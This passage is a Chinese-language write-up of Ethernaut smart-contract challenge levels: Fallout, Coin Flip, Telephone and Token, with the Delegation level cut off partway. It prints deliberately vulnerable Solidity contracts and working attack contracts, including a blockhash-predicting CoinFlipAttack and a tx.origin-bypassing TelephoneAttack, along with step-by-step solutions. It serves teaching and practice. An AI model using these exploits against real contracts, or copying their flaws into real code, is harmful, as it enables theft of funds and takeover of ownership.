<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"openzeppelin-contracts-06/math/SafeMath.sol"</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fallout</span> {</span><br><span class="line">    using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* constructor */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Fal1out</span>(<span class="params"></span>) public payable {</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">        allocations[owner] = msg.<span class="property">value</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyOwner</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">"caller is not the owner"</span>);</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">allocate</span>(<span class="params"></span>) public payable {</span><br><span class="line">        allocations[msg.<span class="property">sender</span>] = allocations[msg.<span class="property">sender</span>].<span class="title function_">add</span>(msg.<span class="property">value</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sendAllocation</span>(<span class="params">address payable allocator</span>) public {</span><br><span class="line">        <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">        allocator.<span class="title function_">transfer</span>(allocations[allocator]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">collectAllocations</span>(<span class="params"></span>) public onlyOwner {</span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">allocatorBalance</span>(<span class="params">address allocator</span>) public view returns (uint256) {</span><br><span class="line">        <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>通过审计上面的代码可以发现，构造函数名称与合约名称不一致使其成为一个public类型的函数，即任何人都可以调用，所以可以直接调用构造函数Fal1out来获取合约的ower权限。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.Fal1out()</span><br></pre></td></tr></table></figure></div>

<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-08-21_14-19-26.png" alt="nipaste_2024-08-21_14-19-2"></p>
<p>最后成功获取到owner权限</p>
<h2 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h2><p><strong>目标</strong></p>
<p>连续猜对硬币方向10次以上</p>
<p><strong>合约代码</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CoinFlip</span> {</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 <span class="variable constant_">FACTOR</span> = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) {</span><br><span class="line">        consecutiveWins = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flip</span>(<span class="params">bool _guess</span>) public returns (bool) {</span><br><span class="line">        uint256 blockValue = <span class="title function_">uint256</span>(<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lastHash == blockValue) {</span><br><span class="line">            <span class="title function_">revert</span>();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / <span class="variable constant_">FACTOR</span>;</span><br><span class="line">        bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (side == _guess) {</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            consecutiveWins = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这段合约代码是一个简单的以太坊智能合约，用于模拟抛硬币游戏。玩家需要猜测硬币的正反面，如果猜对了，他们的连胜次数会增加，否则连胜次数会重置为零。</p>
<p><code>flip</code>函数接受一个布尔值参数<code>_guess</code>，表示玩家的猜测（正面或反面）。</p>
<p>使用<code>blockhash(block.number - 1)</code>获取前一个区块的哈希值，并将其转换为<code>uint256</code>类型的<code>blockValue</code>。</p>
<p>如果当前区块哈希值与上一次相同，则调用<code>revert()</code>终止交易，以防止同一块区块被利用来多次抛硬币。</p>
<p>计算硬币的结果<code>coinFlip</code>，这是通过将<code>blockValue</code>除以<code>FACTOR</code>得到的。<code>coinFlip</code>会是0或1，因此可以被用来判断硬币的正反面。</p>
<p><code>side</code>为<code>true</code>表示硬币为正面，为<code>false</code>表示反面。</p>
<p>如果玩家的猜测与<code>side</code>一致，连胜次数<code>consecutiveWins</code>增加1，函数返回<code>true</code>；否则，连胜次数重置为0，函数返回<code>false</code>。</p>
<p>由于链上数据状态的一致性，透明性，所以我们可以仿照题目合约代码中的逻辑来实现exp，每次都可以猜中对的方向。</p>
<blockquote>
<p><strong>注意事项</strong>：<code>FACTOR</code> 的值大约是 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="3.719ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1643.7 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1000,0)"></path></g></g></g></g></g></svg></mjx-container>，即 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="3.719ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1643.7 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1000,0)"></path></g></g></g></g></g></svg></mjx-container> 的一半。它被用于将一个 256 位的哈希值（即从 <code>blockhash</code> 获取的值）分成两部分。因此最后 side 的值实际上是由 blockvalue 的最高位决定的</p>
</blockquote>
<p>exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-license-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">ICoinFlip</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flip</span>(<span class="params">bool _guess</span>) external returns (bool);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CoinFlipAttack</span> {</span><br><span class="line"></span><br><span class="line">    <span class="title class_">ICoinFlip</span> public victimContract;</span><br><span class="line">    uint256 <span class="variable constant_">FACTOR</span> = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _victimAddress</span>) {</span><br><span class="line">        victimContract = <span class="title class_">ICoinFlip</span>(_victimAddress);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//攻击函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) public {</span><br><span class="line">        <span class="comment">// 仿照抛硬币的计算逻辑</span></span><br><span class="line">        uint256 blockValue = <span class="title function_">uint256</span>(<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>));</span><br><span class="line">        uint256 coinFlip = blockValue / <span class="variable constant_">FACTOR</span>;</span><br><span class="line">        bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用目标合约：传入必胜的 side</span></span><br><span class="line">        victimContract.<span class="title function_">flip</span>(side);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">constructor(address _victimAddress) {</span><br><span class="line">	victimContract = ICoinFlip(_victimAddress);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>上面这段构造函数里面给定地址之后，就可以调用目标合约地址函数功能。</p>
<p>首先开启一个实例，获取其合约地址</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-08-21_15-30-05.png" alt="nipaste_2024-08-21_15-30-0"></p>
<p>其次需要<a class="link" target="_blank" rel="noopener" href="http://remix.ethereum.org/%E7%99%BB%E9%99%86%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%EF%BC%8C%E9%83%A8%E7%BD%B2exp%EF%BC%8C%E7%BC%96%E8%AF%91%E5%AE%8C%E4%B9%8B%E5%90%8E%E8%B0%83%E7%94%A8hack%E5%87%BD%E6%95%B0%EF%BC%8C%E8%AE%BE%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">http://remix.ethereum.org/登陆这个网站，部署exp，编译完之后调用hack函数，设置如下： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-08-21_15-32-25.png" alt="nipaste_2024-08-21_15-32-2"></p>
<p>最后连续调用attack  即可。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-12-11_11-52-12.png" alt="nipaste_2025-12-11_11-52-1"></p>
<p>每次调用可以从终端查看是否成功猜对</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-08-21_15-33-49.png" alt="nipaste_2024-08-21_15-33-4"></p>
<p>连续完成10次之后，提交就可以完成该实例。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-08-21_15-34-35.png" alt="nipaste_2024-08-21_15-34-3"></p>
<h2 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h2><h3 id="msg-sender-tx-origin-辨析"><a href="#msg-sender-tx-origin-辨析" class="headerlink" title="msg.sender & tx.origin 辨析"></a><code>msg.sender</code> &amp; <code>tx.origin</code> 辨析</h3><p><strong>合约代码</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Telephone</span> {</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) {</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">changeOwner</span>(<span class="params">address _owner</span>) public {</span><br><span class="line">        <span class="keyword">if</span> (tx.<span class="property">origin</span> != msg.<span class="property">sender</span>) {</span><br><span class="line">            owner = _owner;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这段代码中可以通过 changeOwner 函数来改变合约的 owner，但是得通过 <code>tx.origin != msg.sender</code> 这一条件。对于这两者之间的区别如下：</p>
<p><code>tx.origin</code> 和 <code>msg.sender</code> 都是 Solidity 中用于标识交易发送者的全局变量，但它们的作用范围和使用场景有显著的区别。了解它们之间的区别对于编写安全的智能合约至关重要。下面是对这两个变量的解释：</p>
<ul>
<li><strong>tx.origin：交易发送方，是整个交易最开始的地址</strong></li>
<li><strong>msg.sender：消息发送方，是当前调用的调用方地址</strong></li>
</ul>
<p>所以如果通过 账户 A -&gt; 合约 A -&gt; 合约 B 来调用的话，tx.origin 就是账户 A，而对于合约 B 来说，msg.sender 是合约 A</p>
<p>所以说，有了上面的知识，我们就可以借助一个中间合约来调用 Telephone，此时 tx.origin 为调用中间合约方（账户A）， msg.sender 则就是中间合约自身。</p>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">ITelephone</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">changeOwner</span>(<span class="params">address _owner</span>) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TelephoneAttack</span> {</span><br><span class="line">    <span class="title class_">ITelephone</span> public victimContract;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _victimAddress</span>){</span><br><span class="line">        victimContract = <span class="title class_">ITelephone</span>(_victimAddress);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) public{</span><br><span class="line">        victimContract.<span class="title function_">changeOwner</span>(msg.<span class="property">sender</span>);</span><br><span class="line">    }</span><br><span class="line">}![nipaste_2026-<span class="number">01</span>-<span class="number">28_22</span>-<span class="number">13</span>-<span class="number">0</span>](<span class="regexp">/images/</span><span class="title class_">Snipaste</span>_2026-<span class="number">01</span>-<span class="number">28_22</span>-<span class="number">13</span>-<span class="number">07</span>.<span class="property">png</span>)</span><br></pre></td></tr></table></figure></div>

<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2026-01-28_22-13-07.png" alt="nipaste_2026-01-28_22-13-0"></p>
<h2 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h2><h3 id="Interger-Overflow-整数溢出"><a href="#Interger-Overflow-整数溢出" class="headerlink" title="Interger Overflow 整数溢出"></a><code>Interger Overflow</code> 整数溢出</h3><blockquote>
<p>The goal of this level is for you to hack the basic token contract below.</p>
<p>You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</p>
<p>  Things that might help:</p>
<ul>
<li>What is an odometer?</li>
</ul>
</blockquote>
<p><strong>合约代码</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Token</span> {</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">uint256 _initialSupply</span>) public {</span><br><span class="line">        balances[msg.<span class="property">sender</span>] = totalSupply = _initialSupply;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint256 _value</span>) public returns (bool) {</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">        balances[msg.<span class="property">sender</span>] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address _owner</span>) public view returns (uint256 balance) {</span><br><span class="line">        <span class="keyword">return</span> balances[_owner];</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>一个整数溢出漏洞</p>
<p><strong>漏洞分析：</strong></p>
<p>请看这段代码（注意 <code>pragma solidity ^0.6.0</code>，这是关键）：</p>
<p>在 Solidity 0.8.0 之前，整数运算<strong>不会自动检查溢出</strong>。</p>
<ul>
<li><code>uint256</code> 是无符号整数（非负数）。</li>
<li>如果你尝试用一个小数字减去一个大数字，比如 <code>20 - 21</code>，它不会变成 <code>-1</code>（因为无符号整数不能是负数）。</li>
<li>相反，它会发生**下溢 (Underflow)**，变成一个巨大的数字：<code>2^256 - 1</code>。</li>
</ul>
<p><strong>具体的漏洞点：</strong></p>
<p>假设你有 20 个 Token (<code>balances[msg.sender] = 20</code>)。<br>如果你尝试转账 21 个 Token (<code>_value = 21</code>)：</p>
<ol>
<li>计算 <code>20 - 21</code>。</li>
<li>由于下溢，结果变成了 <code>115792089237316195423570985008687907853269984665640564039457584007913129639935</code> (即 <code>MAX_UINT</code>)。</li>
<li>这个巨大的数字显然 <code>&gt;= 0</code>，所以 <code>require</code> 检查<strong>通过了</strong>！</li>
<li>接着执行 <code>balances[msg.sender] -= 21</code>。你的余额也会发生下溢，变成那个巨大的数字。</li>
</ol>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-12-11_22-11-48.png" alt="nipaste_2025-12-11_22-11-4"></p>
<h2 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h2><p>这一关的核心在于理解 <code>delegatecall</code> 的工作原理以及它如何影响合约的存储（Storage）。</p>
<h3 id="delegatecall（委托调用）"><a href="#delegatecall（委托调用）" class="headerlink" title="delegatecall（委托调用）"></a><code>delegatecall</code>（委托调用）</h3><p><code>delegatecall</code> 是一种特殊的调用方式。假设合约 A 使用 <code>delegatecall</code> 调用了合约 B 的某个函数：</p>
<ol>
<li><strong>代码逻辑</strong>：执行的是 <strong>合约 B</strong> 的代码。</li>
<li>**上下文 (Context)**：<ul>
<li><code>msg.sender</code> 保持不变（还是调用合约 A 的那个人）。</li>
<li><code>msg.value</code> 保持不变。</li>
</ul>
</li>
<li><strong>存储 (Storage)<strong>：</strong>最关键的一点！</strong> 修改的是 <strong>合约 A</strong> 的数据，而不是合约 B 的。</li>
</ol>
<p><strong>比喻</strong>：<br>合约 A 把合约 B 的代码“借”过来，在自己的地盘上跑了一遍。如果合约 B 的代码里写着“把第 0 号变量改成 123”，那么被修改的是合约 A 的第 0 号变量。</p>
<blockquote>
<p><strong>场景比喻</strong></p>
<ul>
<li><strong>Delegation 合约</strong>：是你（有自己的身体、大脑、记忆）。</li>
<li><strong>Delegate 合约</strong>：是一本<strong>武功秘籍</strong>（只有招式说明，没有实体）。</li>
<li><strong>delegatecall</strong>：是你决定<strong>照着秘籍练功</strong>。</li>
</ul>
<p><strong>发生的过程</strong></p>
<p>当你（Delegation）执行 <code>delegatecall</code> 去调用秘籍（Delegate）里的 <code>pwn()</code> 招式时：</p>
<ol>
<li><strong>代码（招式）来自秘籍</strong>：<br>你确实是在读 <code>Delegate</code> 里的代码：<code>owner = msg.sender</code>。</li>
<li><strong>执行环境（身体）是你自己的</strong>：<br>虽然招式是秘籍里的，但<strong>练功的人是你</strong>。<ul>
<li>代码里说：“把手举起来”。</li>
<li><strong>结果</strong>：举起来的是<strong>你的手</strong>，不是秘籍的手（秘籍也没有手）。</li>
</ul>
</li>
<li><strong>存储（记忆/状态）是你自己的</strong>：<ul>
<li>代码里说：“把 <code>owner</code> 这个变量改成 <code>msg.sender</code>”。</li>
<li>在底层 EVM 中，这句话的意思其实是：“把<strong>第 0 号存储槽 (Slot 0)</strong> 的数据改掉”。</li>
<li>因为当前运行环境是 <strong>Delegation</strong>，所以 EVM 修改的是 <strong>Delegation 的第 0 号存储槽</strong>。</li>
</ul>
</li>
</ol>
<p><strong>对比 <code>call</code> 和 <code>delegatecall</code></strong></p>
<table>
<thead>
<tr>
<th>特性</th>
<th>普通调用 (<code>call</code>)</th>
<th>委托调用 (<code>delegatecall</code>)</th>
</tr>
</thead>
<tbody><tr>
<td><strong>代码来源</strong></td>
<td>目标合约 (B)</td>
<td>目标合约 (B)</td>
</tr>
<tr>
<td><strong>执行环境</strong></td>
<td>目标合约 (B) 的环境</td>
<td><strong>发起合约 (A) 的环境</strong></td>
</tr>
<tr>
